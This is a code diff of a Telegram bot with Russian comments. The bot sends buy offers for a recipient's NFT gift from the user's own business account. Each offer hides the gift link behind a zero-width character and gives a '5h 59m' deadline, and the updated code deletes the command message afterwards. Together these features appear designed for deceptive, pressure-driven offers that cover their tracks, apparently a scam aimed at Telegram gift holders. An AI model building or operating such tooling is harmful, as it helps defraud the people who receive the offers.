@@ -1,5 +1,5 @@
 """
-Sulumi Team Bot — Final P2P Version
+Sulumi Team Bot — Final Full Version
 """
 
 import os
@@ -264,21 +264,20 @@ def handle_message(msg):
         nl = "https://t.me/nft/" + ni["slug"]
         hidden = '<a href="' + nl + '">\u200b</a>'
         
-        # Используем first_name отправителя, но сообщение все равно идет от его аккаунта благодаря sender_bci
         sender_name = msg['from'].get('first_name') or msg['from'].get('username') or "Пользователь"
         caption = hidden + f"<b>{sender_name}</b> предлагает <b>{pr}</b> {cs} за ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>.\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
 
-        # Отправляем в тот же чат (cid), откуда пришла команда, от лица отправителя (sender_bci)
+        # 1. Отправляем оффер
         result = sm_nft(cid, caption, nl, kb=okb(did), bci=sender_bci)
         
         if result.get("ok"):
-            # АВТОУДАЛЕНИЕ команды после успешной отправки
-            if mid and ci:
-                dm(cid, mid, bci=ci)
+            # 2. Удаляем сообщение с командой через sender_bci
+            if mid:
+                dm(cid, mid, bci=sender_bci)
         else:
             err = result.get("description", "err").lower()
             if "business_peer_usage_missing" in err:
-                sm(cid, "❌ Ошибка: бот не может писать в этот чат. Убедись, что ты пишешь команду в ЛС продавцу, и что у тебя подключен бизнес-аккаунт.", bci=ci)
+                sm(cid, "❌ Ошибка: бот не может писать в этот чат. Убедись, что ты пишешь команду в ЛС продавцу.", bci=ci)
             else:
                 sm(cid, f"❌ Ошибка: {result.get('description', 'err')}", bci=ci)
         return
